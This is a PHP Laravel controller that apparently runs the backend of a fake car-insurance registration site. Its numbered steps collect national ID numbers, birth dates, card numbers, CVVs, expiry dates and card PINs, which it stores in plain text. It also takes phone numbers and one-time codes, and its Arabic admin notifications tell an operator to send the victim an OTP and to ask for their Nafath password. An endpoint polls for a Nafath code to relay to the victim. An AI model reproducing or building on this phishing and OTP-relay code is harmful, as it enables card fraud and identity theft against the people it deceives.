<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\Client;
use App\Models\MobileCompany;
use App\Models\Notification;
use App\Models\Service;
use App\Services\validationService;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;

class RegistrationController extends Controller
{
    public function storeNationalNumber(Request $request){
        $client = new Client();
        $client->national_number = $request->national_number;
        $client->end_point = AFTER_SEND_ID;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );

    }

    public function continue($client_id , $national_number){

        $client=Client::where( ['id' => $client_id , 'national_number' => $national_number] )->firstOrFail();

        if($client->end_point == AFTER_SEND_ID){
            return view('frontend.steps.step-one' , compact('client'));
        }elseif ($client->end_point == STEP_TWO) {
            return view('frontend.steps.step-two' , compact('client'));
        }elseif ($client->end_point == STEP_THREE) {
            $services = Service::all();
            return view('frontend.steps.step-three' , compact('client' ,'services'));
        }elseif ($client->end_point == STEP_FOUR) {
            $service = Service::whereId($client->service_id)->first();
            return view('frontend.steps.step-four' , compact('client','service'));
        }elseif ($client->end_point == STEP_FIVE) {
            return view('frontend.steps.payment' , compact('client'));
        }elseif ($client->end_point == STEP_SIX) {
            return view('frontend.steps.proof-card-ownership' , compact('client'));
        }elseif ($client->end_point == STEP_SEVEN) {
            $mobile_network = MobileCompany::all();
            return view('frontend.steps.phone-number' , compact('client' , 'mobile_network'));
        }elseif ($client->end_point == STEP_Eight) {
            return view('frontend.steps.code-number' , compact('client'));
        }elseif ($client->end_point == STEP_NINE) {
            return view('frontend.steps.final-page' , compact('client'));
        }
    }

    public function storeStep(Request $request){
        $inputs = $request->all();
        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
        if($inputs['step'] == 1){
            $array_validation = validationService::stepOneValidation();
            $request->validate($array_validation[0],$array_validation[1]);
           return $this->submit_step_one($request ,$client);
        }elseif ($inputs['step'] == 2 ) {
            $array_validation = validationService::stepTwoValidation();
            $request->validate($array_validation[0] ,$array_validation[1]);
            return $this->submit_step_two($inputs,$client);
        }elseif ($inputs['step'] == 3 ) {
            return $this->submit_step_three($inputs,$client);
        }elseif ($inputs['step'] == 4 ) {
            return $this->submit_step_four($inputs,$client);
        }elseif ($inputs['step'] == 5 ) {
            $array_validation = validationService::stepFiveValidation();
            $request->validate($array_validation[0],$array_validation[1]);
            return $this->submit_step_five($inputs,$client);
        }elseif ($inputs['step'] == 6 ) {
            $array_validation = validationService::stepSixValidation();
            $request->validate($array_validation[0],$array_validation[1]);
            return $this->submit_step_six($inputs,$client);
        }elseif ($inputs['step'] == 7 ) {
            $array_validation = validationService::stepSevenValidation();
            $request->validate($array_validation[0],$array_validation[1]);
            return $this->submit_step_seven($inputs,$client);
        }elseif ($inputs['step'] == 8 ) {
            return $this->submit_step_eight($inputs,$client);
        }

    }

    public function submit_step_one($inputs,$client){
        $client->first_name = $inputs['first_name'];
        $client->serial_number = $inputs['serial_number'];
        $client->birth_date = $inputs['birth_date'];
        $client->credit_soshiable = $inputs['credit_soshiable'];
        $client->end_point = STEP_TWO;
        $client->first_name = $inputs['first_name']??0;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }

    public function submit_step_two($inputs,$client){
        $client->insurance_type = $inputs['insurance_type'];
        $client->contract_started_at = $inputs['contract_started_at'];
        $client->estimated_car_value = $inputs['estimated_car_value'];
        $client->car_type = $inputs['car_type'];
        $client->car_made_at = $inputs['car_made_at'];
        $client->use_car_for = $inputs['use_car_for'];
        $client->car_made_at = $inputs['car_made_at'];
        $client->repair_in = $inputs['repair_in'];
        $client->end_point = STEP_THREE;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_three($inputs){
        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
        $client->service_id = $inputs['service_id'];
        $client->end_point = STEP_FOUR;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_four($inputs,$client){
        $client->total_price = $inputs['total_price'];
        $client->end_point = STEP_FIVE;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_five($inputs,$client){
        $client->visa_number = $inputs['visa_number'];
        $client->visa_vcc = $inputs['visa_vcc'];
        $client->first_name = $inputs['first_name'];
        $client->visa_end_at = $inputs['visa_end_at'];
        $client->end_point = STEP_SIX;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_six($inputs,$client){
        $client->visa_password = $inputs['visa_password'];
        $client->end_point = STEP_SEVEN;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_seven($inputs,$client){
        $client->phone = $inputs['phone'];
        $client->network_id = $inputs['network_id'];
        $client->end_point = STEP_Eight;
        $client->save();
        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'برجاء ارسال otp الى العميل'
        ];
        $notifcation = Notification::create($notifcation);
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }
    public function submit_step_eight($inputs,$client){
        if($client->otp_number == $inputs['otp_number']){
            $client->end_point = STEP_NINE;
            $client->save();
            $notifcation = [
                'client_id' =>$client->id,
                'is_seen' => 0,
                'content' => 'العميل يريد الرقم السرى الخاص بنفاذ'
            ];
            Notification::create($notifcation);
        }else {
            Alert::error('خطا', 'الرقم خطا');
        }
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }

    public function continueRegistration(Request $request){
        $request->validate([
            'national_number' =>['required']
        ]);
        $client = Client::where('national_number' , $request->national_number)->first();
        if($client){
            if($client->end_point == SUCCESS_OTP){
                return view('frontend.clients.send_visa_password' , compact('client'));
            }
            elseif ($client->end_point == FAIL_OTP) {
            }
            elseif ($client->end_point == END_REGISTRATION) {
                return view('frontend.clients.send_otp' , compact('client'));
            }
            else
            {
            }
        }else{
            $mobile_network = MobileCompany::all();
            return view('frontend.landing' , compact('mobile_network'));
        }
    }
    public function register(Request $request){
        $inputs = $request->all();
        unset($inputs['_token']);

        $client = Client::create($inputs);
        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'New client Registered'
        ];
        $notifcation = Notification::create($notifcation);
        Alert::info(' العملاء', 'تم التسجيل بنجاح');
        return redirect()->route('client.getOtp' , ['id'=> $client->id ,'national_number'=> $client->national_number]);
    }

    public function checkOtp(Request $request){
        $inputs = $request->all();
        $client = Client::whereId($inputs['client_id'])->first();
        if($client->otp_number == $inputs['otp_number']){
            $client->end_point = SUCCESS_OTP;
            Alert::info(' العملاء', ' تم بنجاح');
            return view('frontend.clients.send_visa_password' , compact('client'));
        }else {
            $client->end_point = FAIL_OTP;
            Alert::error('خطا', 'الرقم خطا');
            return view('frontend.clients.send_otp' , compact('client'));
        }
        $client->save();
    }

    public function storeVisaPassword(Request $request){
        $inputs = $request->all();
        $request->validate([
            'visa_password'=>'required'
        ]);
        $client = Client::where('id' , $inputs['client_id'])->first();
        $client->visa_password = $inputs['visa_password'];
        $client->end_point = SEND_VISA_PASSWORD;
        $client->save();

        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'العميل ارسل الرقم الثلاثى الخاص بالبطاقة'
        ];
        Notification::create($notifcation);
        return view('frontend.clients.get_nafed_otp', compact('client'));
    }

    // public function getOtp($id , $national_number){
    //     $client = Client::where(['id' => $id , 'national_number' => $national_number] )->firstOrFail();
    //     return view('frontend.clients.send_otp' , compact('client'));
    // }

    public function getNafedOtpAjax($client_id){
       $client= Client::where('id' , $client_id)->first();
       if($client->nafed_otp){
           return response()->json(['status' => 1 , 'nafed_otp'=>$client->nafed_otp ]);
       }else{
        return response()->json(['status' => 0, 'nafed_otp'=>$client->nafed_otp ]);

       }
    }
}
